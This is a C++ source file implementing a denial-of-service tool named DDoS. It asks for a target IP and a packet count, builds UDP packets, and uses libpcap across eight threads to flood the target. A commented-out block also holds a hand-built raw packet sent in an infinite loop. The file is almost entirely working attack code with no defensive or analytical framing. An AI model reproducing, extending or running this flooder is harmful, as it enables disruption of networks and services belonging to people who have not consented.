#include "DDoS.h"
#include "etc_function.h"
#include <pcap.h>
#include <thread>
#include <unistd.h>


DDoS::~DDoS(){
    delete manager;

    pcap_close(handle);
}

void DDoS::Attack(int start, int end){

    for (int i=start; i < end; i++) {
        pcap_sendpacket(handle, Packets[i].data(), 1500);
    }

    /*

    uchar pk[1500] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0x00, 0x0c, 0x29, 0xae, 0xac, 0x39, 0x08, 0x00, 0x45, 0x00, 0x00, 0x48, 0x5a, 0xc0, 0x00, 0x00, 0x80, 0x11, 0x5e, 0x82, 0xc0, 0xa8, 0x00, 0x08, 0xc0, 0xa8, 0x00, 0x0a, 0xe1, 0x15, 0xe1, 0x15, 0x00, 0x34, 0xff, 0x65, 0x53, 0x70, 0x6f, 0x74, 0x55, 0x64, 0x70, 0x30, 0x06, 0xe3, 0xb1, 0xd5, 0x0f, 0x3c, 0x93, 0x31, 0x00, 0x01, 0x00, 0x04, 0x48, 0x95, 0xc2, 0x03, 0x3a, 0x26, 0xa3, 0x4d, 0x71, 0xc7, 0x45, 0xf8, 0x82, 0xbd, 0x84, 0x49, 0x18, 0x90, 0xc6, 0xb8, 0xd0, 0xef, 0x7a, 0x5d};
    pk[1499] = 0x64;
    //for (int i=0; i < 100; i++)
    while(1)
    {
        pcap_sendpacket(handle, pk, 1500);
    }
    */
}

void DDoS::ExecuteAttack()
{
    vector<thread> ddos_thread;
    const int thread_cnt  = 8;

    int pctk_cnt = manager->GetPacketCnt();
    Packets = manager->GetPackets();

    int piece = pctk_cnt / thread_cnt;
    printf("piece: %d\n", piece);
    for (int i=0; i< thread_cnt * 2; i+=2)
        ddos_thread.push_back(thread(&DDoS::Attack, this, (i / 2) * piece, (i / 2 + 1) * piece));
        /*
    for (int i=0; i< thread_cnt * 2; i+=2)
        ddos_thread.push_back(thread(&DDoS::Attack, this, 1, 1));

     */
    for (int i=0;i<thread_cnt; i++)
        ddos_thread[i].join();


}

bool DDoS::Setting(){
    char errbuf[1024];
    handle = pcap_open_live(Dev.c_str(), 0, 1, 1, errbuf);
}

bool DDoS::SetOption(){
    printf("Interface %s\n", Dev.c_str());
    printf("Option part\n");

    printf("Target IP: ");
    string ip;
    cin >> ip;

    int size = ip.size();
    string ip_int[4];
    uchar ip_hex[4];
    int index = 0;

    for(int i=0; i < size; i++){
        if (ip[i] == '.') index++;
        else ip_int[index].push_back(ip[i]);
    }

    for(int i=0;i<4;i++){
        ip_hex[i] = atoi(ip_int[i].c_str());
    }

    printf("Init PacketManager\n");
    manager = new PacketManager(ip_hex);

    printf("Beta\n");
    printf("UDP Count: ");
    int cnt;
    scanf("%d", &cnt);

    manager->MakePacket(UDP, cnt);

    return true;
}
